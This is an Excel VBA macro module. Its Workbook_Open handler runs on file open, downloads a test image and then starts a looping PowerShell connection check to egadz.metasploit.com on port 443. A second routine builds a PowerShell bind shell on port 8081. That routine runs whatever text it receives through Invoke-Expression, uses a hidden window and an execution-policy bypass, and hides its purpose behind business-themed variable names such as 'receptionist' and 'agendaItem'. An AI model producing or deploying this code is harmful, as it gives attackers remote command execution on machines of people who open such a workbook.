Sub DownloadImageToDesktop()
    Dim imageUrl As String
    Dim downloadsPath As String
    Dim fileName As String
    Dim filePath As String
    Dim xmlHttp As Object
    Dim adoStream As Object

    ' Image URL
    imageUrl = "https://upload.wikimedia.org/wikipedia/commons/b/bd/Test.svg"
    ' File name to save as
    fileName = "Test.svg"
    ' Get Downloads path
    downloadsPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%") & "\Downloads"
    filePath = downloadsPath & "\" & fileName

    ' Create XMLHTTP object
    Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
    xmlHttp.Open "GET", imageUrl, False
    xmlHttp.send

    If xmlHttp.Status = 200 Then
        ' Create ADODB.Stream object
        Set adoStream = CreateObject("ADODB.Stream")
        adoStream.Type = 1 ' Binary
        adoStream.Open
        adoStream.Write xmlHttp.responseBody
        adoStream.SaveToFile filePath, 2 ' Overwrite if exists
        adoStream.Close
        ' Spawn PowerShell process to test connection to egadz.metasploit.com:443 every second
        CreateObject("WScript.Shell").Run _
            "powershell -NoExit -Command ""while ($true) {Test-NetConnection egadz.metasploit.com -Port 443; Start-Sleep -Seconds 1}""", 1, False
    End If

    ' Clean up
    Set adoStream = Nothing
    Set xmlHttp = Nothing
End Sub


Private Sub Workbook_Open()
    DownloadImageToDesktop
End Sub 



Sub RunTcpListenerBusiness()
    Dim shell As Object
    Dim psCode As String
    Dim command As String

    ' PowerShell code as a single line, with semicolons separating statements
    psCode = _
        "$meetingRoom=8081;" & _
        "$receptionist=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any,$meetingRoom);" & _
        "$receptionist.Start();" & _
        "$guest=$receptionist.AcceptTcpClient();" & _
        "$conferenceCall=$guest.GetStream();" & _
        "$minutesTaker=New-Object System.IO.StreamWriter($conferenceCall);" & _
        "$noteTaker=New-Object System.IO.StreamReader($conferenceCall);" & _
        "$minutesTaker.AutoFlush=$true;" & _
        "$minutesTaker.WriteLine('Welcome to the business TCP listener. Type your agenda items:');" & _
        "while($true){" & _
        "$agendaItem=$noteTaker.ReadLine();" & _
        "if($agendaItem -eq 'exit'){break};" & _
        "try{$actionItems=Invoke-Expression $agendaItem|Out-String}catch{$actionItems=$_.Exception.Message};" & _
        "$minutesTaker.WriteLine($actionItems)};" & _
        "$minutesTaker.Close();" & _
        "$noteTaker.Close();" & _
        "$guest.Close();" & _
        "$receptionist.Stop();"

    ' Escape double quotes for command line
    psCode = Replace(psCode, """", "`""")

    ' Build the PowerShell command
    command = "powershell.exe -ExecutionPolicy Bypass -Command """ & psCode & """"

    Set shell = CreateObject("WScript.Shell")
    shell.Run command, 0, False
End Sub
